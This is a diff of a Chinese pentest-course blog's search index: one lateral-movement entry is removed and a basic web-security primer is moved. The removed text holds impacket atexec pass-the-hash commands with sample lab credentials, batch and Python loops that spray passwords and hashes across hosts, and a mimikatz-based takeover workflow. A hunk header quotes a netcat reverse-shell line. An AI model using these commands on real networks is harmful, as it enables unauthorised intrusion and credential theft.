-
-
-
-<h2 id="横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包"><a href="#横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包" class="headerlink" title="横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)"></a>横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)</h2><p>之前的at和schtasks只能传明文，传递密文使用atexec（这个工具还带有提权，whoami返回system），但这个是第三方文件，需要做免杀</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">atexec.exe ./用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe 域名/用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> 密码的hash值 ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">atexec.exe ./administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="横向渗透明文、Hash传递批量利用"><a href="#横向渗透明文、Hash传递批量利用" class="headerlink" title="横向渗透明文、Hash传递批量利用"></a>横向渗透明文、Hash传递批量利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win自带命令+net use</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># win自带命令+atexec</span></span><br><span class="line"><span class="comment">## 批量检测多IP对应一明文</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> atexec.exe ./用户名:密码<span class="selector-tag">@</span>%%i <span class="string">&quot;命令]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> atexec.exe ./administrator:admin!<span class="selector-tag">@</span><span class="comment">#45@%%i whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多明文对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./用户名:%%i@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./administrator:%%i@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多HASH对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击流程（已有一台服务器权限）"><a href="#攻击流程（已有一台服务器权限）" class="headerlink" title="攻击流程（已有一台服务器权限）"></a>攻击流程（已有一台服务器权限）</h3><ol>
-<li><p>使用mimikatz获取密码（明文+密文）</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002315030.png" alt="image-20220310002315030"></p>
-<p>得到密码，并作记录</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002349383.png" alt="image-20220310002349383"></p>
-</li>
-<li><p>用自带命令探针同网段下存活主机</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002735038.png" alt="image-20220310002735038"></p>
-</li>
-<li><p>使用自带语法+atexec，批量检测多ip对应一明文。这里将ip都存放在同一文件内，执行如下bat文件</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003002026.png" alt="image-20220310003002026"></p>
-</li>
-<li><p>执行完后，探针到另一台服务器也有相同密码</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003127002.png" alt="image-20220310003127002"></p>
-</li>
-<li><p> 如法炮制，在新地址上传mimikatz获取新密码，密码字典+1芜湖</p>
-</li>
-</ol>
-<p>   <img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003404796.png" alt="image-20220310003404796"></p>
-<ol start="6">
-<li><p>再故技重施，用新密码重新完成步骤3的工作，成功得到域控的权限，到此基本结束</p>
-<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003652617.png" alt="image-20220310003652617"></p>
-</li>
-</ol>
-<p>注意：真实环境不会这么快这么简单，但思路差不多</p>
-<h2 id="横向渗透明文、Hash传递批量利用-升级版"><a href="#横向渗透明文、Hash传递批量利用-升级版" class="headerlink" title="横向渗透明文、Hash传递批量利用-升级版"></a>横向渗透明文、Hash传递批量利用-升级版</h2><p>考虑到前文的批处理只有一个变量，导致检测效率很低，所以我们选择python来写，将用户名、密码、ip地址都定义为变量提高效率，还可以使用多线程</p>
-<p>利用py脚本制作的exe文件批量尝试横向渗透</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用代码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.安装pyinstaller</span></span><br><span class="line"><span class="string">pip install pyinstaller</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.生成可执行EXE</span></span><br><span class="line"><span class="string">Pyinstaller -F py文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.会生成一个同名的exe文件</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;<span class="comment"># 通过net user /domain收集</span></span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> pas <span class="keyword">in</span> passs:</span><br><span class="line">            <span class="built_in">exec</span>=<span class="string">&quot;net use \\&quot;</span>+<span class="string">&quot;\\&quot;</span>+ip+<span class="string">&quot;\ipc$&quot;</span>+pas+<span class="string">&quot;/user:god\\&quot;</span>+user</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+<span class="built_in">exec</span>+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://gitee.com/RichChigga/impacket-examples-windows">impacket-examples-windows</a></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>小迪安全</p>
-<p><a href="https://www.sohu.com/a/515863300_99907709">域内横向移动_ipc$_命令_目标</a></p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础入门</title>
-    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<p>基础入门</p>
-<span id="more"></span>
-<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
-<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
-<p>操作系统：windows、linux</p>
-<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
-<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
-<p>​    </p>
-<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
-<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
-<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
-<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%851.jpg" alt="数据包1"></p>
-<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
-<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%852.JPG" alt="数据包2"></p>
-<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
-<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
-<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
-<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
-<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
-<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
-<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
-<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
-<p>2xx    成功，行为被成功地执行</p>
-<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
-<p>4xx    客户端错误</p>
-<p>5xx    服务端错误</p>
-<p>200    存在文件</p>
-<p>403    存在文件夹</p>
-<p>3xx    均可能存在</p>
-<p>404    不存在文件及文件夹</p>
-<p>500    均可能存在</p>
-<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
-<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
-<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
-<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
-<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
-<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
-<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
-<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
-<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
-<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
-<p>php+mysql</p>
-<p>aspx+mssql</p>
-<p>jsp+mssql,oracle</p>
-<p>python+mongodb</p>
-<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
-<p>oracle    1521</p>
-<p>sqlsever    1433</p>
-<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
-<p>搜索特定关键字加密字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域环境&amp;工作组&amp;局域网探针方式</title>
     <url>/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/</url>
     <content><![CDATA[<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309121939190.png" alt="image-20220309121939190"></p>
@@ -2705,6 +2640,71 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       <tags>
         <tag>渗透测试</tag>
         <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础入门</title>
+    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>基础入门</p>
+<span id="more"></span>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
+<p>操作系统：windows、linux</p>
+<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
+<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
+<p>​    </p>
+<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
+<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
+<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
+<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%851.jpg" alt="数据包1"></p>
+<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
+<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%852.JPG" alt="数据包2"></p>
+<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
+<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
+<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
+<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
+<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
+<p>2xx    成功，行为被成功地执行</p>
+<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx    客户端错误</p>
+<p>5xx    服务端错误</p>
+<p>200    存在文件</p>
+<p>403    存在文件夹</p>
+<p>3xx    均可能存在</p>
+<p>404    不存在文件及文件夹</p>
+<p>500    均可能存在</p>
+<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
+<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
+<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
+<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
+<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
+<p>php+mysql</p>
+<p>aspx+mssql</p>
+<p>jsp+mssql,oracle</p>
+<p>python+mongodb</p>
+<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
+<p>oracle    1521</p>
+<p>sqlsever    1433</p>
+<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
+<p>搜索特定关键字加密字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
